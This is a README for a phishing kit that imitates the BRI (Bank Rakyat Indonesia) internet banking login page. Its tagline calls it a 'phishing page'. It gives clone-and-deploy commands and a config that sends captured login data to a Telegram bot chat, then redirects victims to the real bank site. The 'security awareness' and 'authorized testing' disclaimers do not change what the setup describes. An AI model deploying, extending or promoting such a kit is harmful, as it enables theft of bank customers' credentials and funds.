<p align="center">
  <svg width="80" height="48" viewBox="0 0 120 36" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect x="0" y="0" width="28" height="36" rx="4" fill="#00247d"/>
    <text x="5" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="24" fill="#fff">B</text>
    <rect x="32" y="0" width="28" height="36" rx="4" fill="#00247d"/>
    <text x="38" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="24" fill="#fff">R</text>
    <rect x="64" y="0" width="28" height="36" rx="4" fill="#00247d"/>
    <text x="71" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="24" fill="#fff">I</text>
  </svg>
</p>

<h1 align="center">BRI Internet Banking</h1>

<p align="center">
  <strong>✦ welcome to tracking dev phishing page bri ✦</strong>
</p>

<p align="center">
  <img src="assets/running-text.svg" alt="running text" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/PHP-777BB4?style=flat&logo=php&logoColor=white" alt="PHP" />
  <img src="https://img.shields.io/badge/HTML5-E34F26?style=flat&logo=html5&logoColor=white" alt="HTML5" />
  <img src="https://img.shields.io/badge/CSS3-1572B6?style=flat&logo=css3&logoColor=white" alt="CSS3" />
  <img src="https://img.shields.io/badge/JavaScript-F7DF1E?style=flat&logo=javascript&logoColor=black" alt="JavaScript" />
  <img src="https://img.shields.io/badge/license-MIT-blue?style=flat" alt="License" />
</p>

<br />

## 📋 Overview

**BRI Internet Banking** is a responsive, mobile-first web interface designed to replicate the look and feel of a modern digital banking login portal. Built with clean semantics, smooth animations, and a professional aesthetic — suitable for UI demonstrations, security awareness training, and controlled simulation environments.

### ✨ Features

| Feature | Description |
|---------|-------------|
| 🎨 **Premium UI** | Pixel-perfect BRI branding with gradient header, card layout, and micro-interactions |
| 📱 **Fully Responsive** | Adaptive layout from 360px mobile to widescreen desktop |
| 🔐 **Input Validation** | Client-side form handling with loading states and feedback |
| 🌐 **Multi-language Toggle** | ID/EN language switcher in header |
| 🖼️ **SVG Icons** | Clean vector icons for all interactive elements |
| ⚡ **Lightweight** | Single PHP file, no external dependencies |

<br />

## 🚀 Quick Start

```bash
# Clone the repository
git clone https://github.com/clickmamaheti-prog/bri-banking-page.git
cd bri-banking-page

# Configure (copy & edit)
cp config.example.php config.php
# Edit config.php with your credentials

# Deploy with built-in PHP server
php -S 0.0.0.0:8080
```

> **Note:** Requires PHP 7.4+ with `curl` extension enabled.

<br />

## 📁 Project Structure

```
bri-banking-page/
├── index.php            # Main application entry point
├── config.php           # Sensitive configuration (gitignored)
├── config.example.php   # Configuration template
├── assets/
│   └── running-text.svg # Animated running text banner
├── log.txt              # Session log (gitignored)
└── .gitignore
```

<br />

## 🛠️ Configuration

Copy the example config and fill in your settings:

```php
// config.php
define('BOT_TOKEN', 'YOUR_BOT_TOKEN');
define('CHAT_ID', 'YOUR_CHAT_ID');
define('REDIRECT_URL', 'https://bri.co.id/');
```

| Parameter | Description |
|-----------|-------------|
| `BOT_TOKEN` | Telegram bot API token for notifications |
| `CHAT_ID` | Target chat/user ID for incoming data |
| `REDIRECT_URL` | Post-login redirect destination |

<br />

## 🎯 Use Cases

- **Security Awareness Training** — Demonstrate phishing simulation in controlled environments
- **UI/UX Showcase** — Clean banking interface template for portfolio or reference
- **Penetration Testing** — Authorized security assessments with proper consent
- **Educational Labs** — CTF challenges and red team exercises

> ⚠️ **Important:** This project is intended for **authorized security testing and educational purposes only**. Unauthorized use against live systems or individuals is illegal and unethical.

<br />

## 📸 Preview

| Desktop | Mobile |
|---------|--------|
| Full-width layout with sticky header | Compact card with bottom navigation |
| Smooth hover states & transitions | Touch-optimized inputs & buttons |
| Expanded footer with service links | Collapsible grid footer |

<br />

## 🧩 Tech Stack

| Layer | Technology |
|-------|-----------|
| **Backend** | PHP 7.4+ |
| **Frontend** | HTML5, CSS3, Vanilla JS |
| **API** | Telegram Bot API |
| **Styling** | CSS Flexbox, CSS Grid, Keyframe Animations |
| **Security** | SSL-ready, Environment-based config |

<br />

## 📄 License

Distributed under the MIT License. See `LICENSE` for more information.

---

<p align="center">
  <sub>Built for educational and authorized security testing purposes.</sub>
  <br />
  <sub>BRI is a registered trademark of PT Bank Rakyat Indonesia (Persero) Tbk.</sub>
</p>
